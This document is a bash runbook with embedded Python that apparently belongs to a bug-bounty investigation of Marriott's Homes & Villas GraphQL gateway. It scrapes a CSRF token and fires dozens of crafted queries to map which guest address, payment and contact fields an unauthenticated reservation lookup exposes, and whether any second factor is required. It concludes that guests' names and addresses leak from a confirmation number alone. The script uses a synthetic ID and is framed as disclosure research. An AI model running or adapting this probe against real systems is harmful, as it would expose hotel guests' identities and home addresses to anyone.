#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV reservationDetails: expand address objects + 2nd-factor (s45)
# Portable: Linux / Pi / Termux.
#
# s44: reservationDetails (unauth, confirmation_id only) exposes guest_first_name,
# guest_last_name, guest_address(OBJECT), property_name, property_address(OBJECT),
# check_in/out_date, number_of_guests, reservation_status, total, currency.
# Phase-B 2nd-factor check was inconclusive (JSON-escaping bug -> "Bad Request").
#
# This run (payloads built in Python = no escaping bugs):
#   A. Expand guest_address {} subfields (street/city/state/postal/country...)
#   B. Expand property_address {} subfields
#   C. 2nd-factor check via GraphQL VARIABLES (is last_name/email an accepted
#      arg? "Unknown argument" => pure IDOR, no second factor)
#   D. Discover any other object fields (guest/payment/host/contact)
#
# SAFETY: SYNTHETIC confirmation id only -> fields resolve null (schema mapping,
# not real data). Read-only, no mutations, stop on any real PII.
#
# Run (Termux): OUTDIR=$HOME/s45 bash runbooks/PI-RUNBOOK-session45-hnv-address-expand.sh \
#                 2>&1 | tee $HOME/s45/s45.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s45
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s45"
  else OUTDIR="$HOME/s45"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"; JAR="$OUTDIR/jar.txt"
export SYN="ZZTEST-0000-0000-NOTREAL"

echo "============================================================"
echo "HNV ADDRESS EXPAND  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR"; echo "============================================================"; echo ""

curl -s -o "$OUTDIR/home.html" -c "$JAR" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" >/dev/null || true
TOK=$(grep -oE 'id="sourceid"[^>]*data-source="[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*data-source="([^"]+)".*/\1/')
[ -z "$TOK" ] && TOK=$(grep -oE '"csrfToken":"[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*:"([^"]+)"/\1/')
export TOK; echo "csrf token: ${TOK:0:30}..."; echo ""

# Build all payloads in Python (robust escaping), then curl each.
python3 - << 'PYEOF'
import os,json
O=os.environ["OUTDIR"]; SYN=os.environ["SYN"]
jobs={}
addr_sub=["street","street1","street2","line1","line2","address","address1","city",
          "state","province","region","postal_code","postalCode","zip","zip_code",
          "country","country_code","county","latitude","longitude","formatted","full"]
def q(sel): return {"query":f"query R($c:ID!){{reservationDetails(confirmation_id:$c){{{sel}}}}}","variables":{"c":SYN}}
# A: guest_address subfields
for s in addr_sub: jobs[f"a-{s}"]=q(f"guest_address{{{s}}}")
# B: property_address subfields
for s in addr_sub: jobs[f"b-{s}"]=q(f"property_address{{{s}}}")
# C: second-factor args (via variables -> no inline quotes)
for arg in ["last_name","guest_last_name","email","guest_email","last_name_initial","pin","lastName","surname"]:
    jobs[f"c-{arg}"]={"query":f"query R($c:ID!,$x:String){{reservationDetails(confirmation_id:$c,{arg}:$x){{__typename}}}}","variables":{"c":SYN,"x":"Z"}}
# D: other candidate object fields
for o in ["guest","guests","primary_guest","contact","payment","payment_details","host",
          "listing","property","unit","price","pricing","charges","booking","stay","dates"]:
    jobs[f"d-{o}"]=q(f"{o}{{__typename}}")
for tag,body in jobs.items():
    json.dump(body, open(os.path.join(O,f"p-{tag}.req"),"w"))
print(f"  built {len(jobs)} payloads")
PYEOF

post() { # tag
  curl -s -o "$OUTDIR/$1.json" -b "$JAR" -H "User-Agent: $UA" -H "$IDH" \
    -H 'Content-Type: application/json' -H 'Accept: application/json' \
    -H "Origin: $B" -H "Referer: $B/" -H "x-hvmi-csrf-token: $TOK" \
    --max-time 20 --data @"$OUTDIR/p-$1.req" "$B/gateway/graphql" >/dev/null 2>&1 || true
}
verdict() { # tag  -> prints classification
  local b; b=$(cat "$OUTDIR/$1.json" 2>/dev/null)
  if echo "$b" | grep -q "Cannot query field"; then echo "absent"
  elif echo "$b" | grep -qi "Unknown argument"; then echo "NO-SUCH-ARG"
  elif echo "$b" | grep -qi "must have a selection"; then echo "OBJECT"
  elif echo "$b" | grep -q '"data"'; then echo "PRESENT"
  else echo "other: $(echo "$b"|head -c 70|tr '\n' ' ')"; fi
}

echo "═══ PHASE A: guest_address {} subfields ═══"
for s in street street1 street2 line1 line2 address address1 city state province region postal_code postalCode zip zip_code country country_code county latitude longitude formatted full; do
  post "a-$s"; r=$(verdict "a-$s"); [ "$r" != "absent" ] && printf '  %-14s %s\n' "$s" "$r"; sleep 0.2
done
echo ""
echo "═══ PHASE B: property_address {} subfields ═══"
for s in street street1 street2 line1 line2 address address1 city state province region postal_code postalCode zip zip_code country country_code county latitude longitude formatted full; do
  post "b-$s"; r=$(verdict "b-$s"); [ "$r" != "absent" ] && printf '  %-14s %s\n' "$s" "$r"; sleep 0.2
done
echo ""
echo "═══ PHASE C: SECOND-FACTOR ARG CHECK (via variables) ═══"
for a in last_name guest_last_name email guest_email last_name_initial pin lastName surname; do
  post "c-$a"; printf '  %-18s %s\n' "$a" "$(verdict "c-$a")"; sleep 0.25
done
echo "  (NO-SUCH-ARG on all => pure IDOR, confirmation_id is the only input)"
echo ""
echo "═══ PHASE D: OTHER OBJECT FIELDS ═══"
for o in guest guests primary_guest contact payment payment_details host listing property unit price pricing charges booking stay dates; do
  post "d-$o"; r=$(verdict "d-$o"); [ "$r" != "absent" ] && printf '  %-16s %s\n' "$o" "$r"; sleep 0.2
done
echo ""

echo "════════════════════════════════════════════"
echo "UPDATED CASE SUMMARY"
echo "════════════════════════════════════════════"
python3 - << 'PYEOF'
import os,glob
O=os.environ["OUTDIR"]
def present(prefix):
    out=[]
    for f in glob.glob(os.path.join(O,f"{prefix}-*.json")):
        b=open(f).read()
        if "Cannot query field" not in b and '"data"' in b:
            out.append(os.path.basename(f)[len(prefix)+1:-5])
        elif "must have a selection" in b:
            out.append(os.path.basename(f)[len(prefix)+1:-5]+"{}")
    return sorted(set(out))
ga=present("a"); pa=present("b")
# second factor
sf_args=[]
for f in glob.glob(os.path.join(O,"c-*.json")):
    if "Unknown argument" not in open(f).read():
        sf_args.append(os.path.basename(f)[2:-5])
print("  guest_address subfields   :", ga)
print("  property_address subfields:", pa)
print("  accepted 2nd-factor args  :", sf_args or "NONE -> pure IDOR (confirmation_id only)")
print()
print("  Confirmed unauth exposure via confirmation_id alone:")
print("   guest_first_name, guest_last_name, guest_address{"+",".join(ga)+"},")
print("   property_name, property_address, check_in_date, check_out_date,")
print("   number_of_guests, reservation_status, total, currency")
print()
print("  => Unauthenticated BOLA disclosing a guest's full identity (name+address)")
print("     and reservation. Severity HIGH (CRITICAL if confirmation numbers are")
print("     enumerable). Ready to draft report. Real-data PoC = own booking only.")
PYEOF
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
